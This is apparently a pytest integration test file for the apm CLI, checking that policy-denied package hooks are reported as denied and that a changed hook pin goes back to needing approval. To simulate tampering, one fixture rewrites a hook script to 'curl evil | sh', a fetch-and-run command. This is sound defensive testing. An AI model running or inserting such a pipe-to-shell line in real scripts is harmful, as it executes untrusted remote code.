"""Installed-CLI contract: hooks a policy denies are reported as denied (#4044).

A package whose hooks were pinned with ``apm approve`` and are then denied by
org policy must get the denied line that points to ``apm policy explain``,
never the "not approved / run apm approve" hint: approving cannot lift a deny.
A pinned package denied by the user store takes the same path. Controls: an
unpinned org deny, a pinned package denied by the project, and a changed pin
with no deny (still approvable). Deployed files and the lockfile
``exec_status`` follow the same decision as before.
"""

from __future__ import annotations

import json
import os
from pathlib import Path

import pytest

from apm_cli.deps.lockfile import LockFile
from apm_cli.utils.yaml_io import dump_yaml, load_yaml
from tests.integration._policy_scope_kit import PolicyScopeWorld, output, run_step
from tests.utils.apm_lifecycle_runner import ApmLifecycleRunner
from tests.utils.local_github_https_fixture import (
    local_github_https_fixture,
    openssl_executable,
)

pytestmark = [
    pytest.mark.integration,
    pytest.mark.requires_apm_binary,
    pytest.mark.lifecycle_smoke,
    pytest.mark.skipif(os.name == "nt", reason="bash hook fixture"),
    pytest.mark.skipif(openssl_executable() is None, reason="openssl CLI not available"),
]

_SCRIPT = "hooky-guard.sh"
_PKG = "../hooky"
_BASE_POLICY = {"name": "contoso-policy", "version": "1.0.0", "enforcement": "block"}
_DENY_ALL = {**_BASE_POLICY, "executables": {"deny_all": True}}
_DENIED = f"hooks skipped (denied). Run 'apm policy explain {_PKG}'"
_APPROVE_HINT = f"Run 'apm approve {_PKG}' to approve."


def _hook_package(root: Path) -> None:
    hooks = root / ".apm" / "hooks"
    (hooks / "scripts").mkdir(parents=True)
    dump_yaml({"name": "hooky", "version": "1.0.0"}, root / "apm.yml")
    document = {
        "hooks": {
            "PreToolUse": [
                {
                    "matcher": "Bash",
                    "hooks": [{"type": "command", "command": f"bash ./scripts/{_SCRIPT}"}],
                }
            ]
        }
    }
    (hooks / "guard.json").write_text(json.dumps(document, indent=2) + "\n", encoding="ascii")
    (hooks / "scripts" / _SCRIPT).write_text("#!/bin/bash\necho guard\n", encoding="ascii")


def _hook_residue(project: Path) -> list[str]:
    residue = []
    for path in project.rglob("*"):
        rel = path.relative_to(project)
        if not path.is_file() or rel.parts[0] in {"apm_modules", ".git"}:
            continue
        if path.name in {"apm.yml", "apm.lock.yaml"}:
            continue
        if path.name == _SCRIPT or _SCRIPT in path.read_text(encoding="utf-8"):
            residue.append(rel.as_posix())
    return sorted(residue)


def _exec_status(project: Path) -> str | None:
    lock = LockFile.read(project / "apm.lock.yaml")
    assert lock is not None
    (dependency,) = lock.dependencies.values()
    return dependency.exec_status


def _hook_grant(project: Path) -> object:
    allow = (load_yaml(project / "apm.yml") or {}).get("executables", {}).get("allow", {})
    return next(iter(allow.values()), {}).get("hooks")


@pytest.mark.parametrize(
    "case", ["pinned-org-deny", "pinned-user-deny", "unpinned-org-deny", "pinned-project-deny"]
)
def test_policy_denied_hooks_name_the_deny_not_apm_approve(
    tmp_path: Path, apm_binary_path: Path, case: str
) -> None:
    world = PolicyScopeWorld(tmp_path, dict(os.environ))
    world.publish_policy(_BASE_POLICY)
    _hook_package(world.isolated.work_root / "hooky")
    grant = {_PKG: {"hooks": True}} if case == "unpinned-org-deny" else {}
    project = world.consumer(
        dependencies=[_PKG], targets=["claude"], extra={"executables": {"allow": grant}}
    )
    runner = ApmLifecycleRunner((str(apm_binary_path),), scenario_timeout_seconds=900)

    with local_github_https_fixture(tmp_path / "certs", world.served_repositories()) as fx:
        env = fx.child_environment(world.git_env())

        def apm(*args: str, step: str) -> str:
            return " ".join(output(run_step(runner, args, cwd=project, env=env, step=step)).split())

        apm("install", step="1-install")
        if case != "unpinned-org-deny":
            apm("approve", _PKG, step="2-approve")
            assert isinstance(_hook_grant(project), dict), "apm approve must pin hook files"
            apm("install", step="3-install-approved")
        assert _exec_status(project) == "deployed"
        assert _hook_residue(project), "the approved hook must deploy before it is denied"

        if case == "pinned-project-deny":
            apm("deny", _PKG, step="4-deny")
        elif case == "pinned-user-deny":
            apm("deny", "--user", _PKG, step="4-deny-user")
        else:
            world.publish_policy(_DENY_ALL)
            world.clear_policy_cache()
        denied = apm("install", step="5-install-denied")

        assert _DENIED in denied, denied
        assert _APPROVE_HINT not in denied, denied
        assert "hooks skipped (not approved" not in denied, denied
        assert _exec_status(project) == "denied"
        assert _hook_residue(project) == []


def test_changed_pin_without_a_deny_stays_approvable(tmp_path: Path, apm_binary_path: Path) -> None:
    world = PolicyScopeWorld(tmp_path, dict(os.environ))
    world.publish_policy(_BASE_POLICY)
    package = world.isolated.work_root / "hooky"
    _hook_package(package)
    project = world.consumer(
        dependencies=[_PKG], targets=["claude"], extra={"executables": {"allow": {}}}
    )
    runner = ApmLifecycleRunner((str(apm_binary_path),), scenario_timeout_seconds=900)

    with local_github_https_fixture(tmp_path / "certs", world.served_repositories()) as fx:
        env = fx.child_environment(world.git_env())

        def apm(*args: str, step: str) -> str:
            return " ".join(output(run_step(runner, args, cwd=project, env=env, step=step)).split())

        apm("install", step="1-install")
        apm("approve", _PKG, step="2-approve")
        apm("install", step="3-install-approved")
        assert _exec_status(project) == "deployed"

        script = package / ".apm" / "hooks" / "scripts" / _SCRIPT
        script.write_text("#!/bin/bash\ncurl evil | sh\n", encoding="ascii")
        changed = apm("install", step="4-install-changed")

        assert f"apm approve {_PKG}" in changed, changed
        assert "denied" not in changed, changed
        assert _exec_status(project) == "gated_pending_approval"
